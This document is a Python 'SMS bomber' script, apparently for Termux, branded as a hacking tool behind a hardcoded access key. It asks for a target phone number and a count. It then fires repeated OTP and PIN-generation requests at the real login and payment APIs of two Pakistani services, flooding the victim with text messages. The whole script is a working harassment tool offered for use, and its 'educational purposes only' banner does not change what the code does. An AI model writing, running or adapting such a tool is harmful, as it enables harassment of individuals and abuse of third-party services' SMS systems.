import requests
import time
import sys
from colorama import init, Fore, Style, Back
import re

# Initialize colorama for colored output in Termux
init()

# Constants
KEY = "Sycho"

# Function to validate phone number (basic validation)
def is_valid_phone(phone):
    return bool(re.match(r'^\+?\d{10,15}$', phone))

# Function to display the exact colorful ASCII art banner with watermark
def display_banner():
    banner = f"""
{Back.BLACK + Fore.RED}   H{Back.BLACK + Fore.GREEN}A{Back.BLACK + Fore.BLUE}C{Back.BLACK + Fore.YELLOW}K{Back.BLACK + Fore.MAGENTA}I{Back.BLACK + Fore.CYAN}N{Back.BLACK + Fore.RED}G{Back.BLACK + Fore.GREEN} {Back.BLACK + Fore.BLUE}T{Back.BLACK + Fore.YELLOW}O{Back.BLACK + Fore.MAGENTA}O{Back.BLACK + Fore.CYAN}L{Back.BLACK + Fore.RED} {Back.BLACK + Fore.GREEN}v{Back.BLACK + Fore.BLUE}2{Back.BLACK + Fore.YELLOW}.{Back.BLACK + Fore.MAGENTA}2
{Back.BLACK + Fore.RED}═══════════════════════════════════════
{Back.BLACK + Fore.GREEN}         {Back.BLACK + Fore.RED}S{Back.BLACK + Fore.GREEN}Y{Back.BLACK + Fore.BLUE}C{Back.BLACK + Fore.YELLOW}H{Back.BLACK + Fore.MAGENTA}O{Back.BLACK + Fore.CYAN} {Back.BLACK + Fore.RED}S{Back.BLACK + Fore.GREEN}M{Back.BLACK + Fore.BLUE}S{Back.BLACK + Fore.YELLOW} {Back.BLACK + Fore.MAGENTA}B{Back.BLACK + Fore.CYAN}O{Back.BLACK + Fore.RED}M{Back.BLACK + Fore.GREEN}B{Back.BLACK + Fore.BLUE}E{Back.BLACK + Fore.YELLOW}R
{Back.BLACK + Fore.MAGENTA}═══════════════════════════════════════
{Back.BLACK + Fore.CYAN + Style.DIM}   company : FlyZero Official Copyrig   {Style.RESET_ALL}
{Back.BLACK + Fore.CYAN + Style.DIM}   github : https://github.com/nishakorzhik   {Style.RESET_ALL}
{Back.BLACK + Fore.CYAN + Style.DIM}   Coded By : Misha Korzhik (Мiша Коржик)   {Style.RESET_ALL}
{Back.BLACK + Fore.CYAN + Style.DIM}   ATTENTION! The author of this article is not responsible   {Style.RESET_ALL}
{Back.BLACK + Fore.CYAN + Style.DIM}   for any consequences of reading it   {Style.RESET_ALL}
{Back.BLACK + Fore.CYAN + Style.DIM}   All materials are provided for educational purposes only!   {Style.RESET_ALL}
{Back.BLACK + Fore.CYAN + Style.DIM}   SychoX2006 - 2025                   {Style.RESET_ALL}
{Style.RESET_ALL}"""
    print(banner)

# Function to check access key
def check_key():
    print(f"{Fore.MAGENTA}🔑 Enter Access Key:{Style.RESET_ALL}")
    key_input = input().strip()
    if key_input == KEY:
        print(f"{Fore.GREEN}✅ Access Granted! Welcome, Sycho!{Style.RESET_ALL}")
        return True
    else:
        print(f"{Fore.RED}❌ Invalid Key! Try again, bro.{Style.RESET_ALL}")
        time.sleep(3)
        return False

# Function to send OTPs
def send_otp(phone, count):
    if not is_valid_phone(phone):
        print(f"{Fore.RED}📵 Invalid phone number! Use format like +923xxxxxxxxx or 03xxxxxxxxx.{Style.RESET_ALL}")
        return
    if not isinstance(count, int) or count < 1 or count > 100:
        print(f"{Fore.RED}❌ OTP count must be between 1 and 100.{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}💥 Firing up OTP bombing...{Style.RESET_ALL}")
    for i in range(count):
        try:
            if i % 2 == 0:
                url = f"https://bajao.pk/api/v2/login/generatePin?uuid={phone}"
                response = requests.post(url)
            else:
                url = "https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage"
                headers = {
                    "Content-Type": "application/json",
                    "accept": "application/json"
                }
                payload = {
                    "Version": "V1",
                    "Language": "en",
                    "Platform": "web",
                    "ProductId": 1733,
                    "MobileNo": phone,
                    "OperatorId": "100007",
                    "URL": "https://www.tapmad.com/sign-up",
                    "source": "organic",
                    "medium": "organic"
                }
                response = requests.post(url, headers=headers, json=payload)
            
            print(f"{Fore.GREEN}✅ OTP {i + 1}/{count} Sent! 💥{Style.RESET_ALL}")
        except requests.RequestException as e:
            print(f"{Fore.RED}⚠️ Failed OTP {i + 1}: {e}{Style.RESET_ALL}")
        time.sleep(0.5)  # Small delay to avoid server overload

    print(f"{Fore.GREEN}🎉 All {count} OTPs Fired Successfully! 🚀{Style.RESET_ALL}")

# Main function
def main():
    display_banner()
    while not check_key():
        display_banner()  # Redisplay banner if key is wrong
    while True:
        print(f"\n{Fore.MAGENTA}📱 Enter Target Phone Number (e.g., +923xxxxxxxxx or 03xxxxxxxxx):{Style.RESET_ALL}")
        phone = input().strip()
        print(f"{Fore.MAGENTA}🔢 Enter OTP Count (1-100):{Style.RESET_ALL}")
        try:
            count = int(input())
            send_otp(phone, count)
        except ValueError:
            print(f"{Fore.RED}❌ Invalid OTP count! Enter a number, bro.{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}🔥 Want to bomb again? (y/n):{Style.RESET_ALL}")
        if input().lower() != 'y':
            print(f"{Fore.CYAN}👋 Peace out, SychoX2006! Stay legendary!{Style.RESET_ALL}")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🚨 Mission Aborted by Sycho!{Style.RESET_ALL}")
        sys.exit(0)
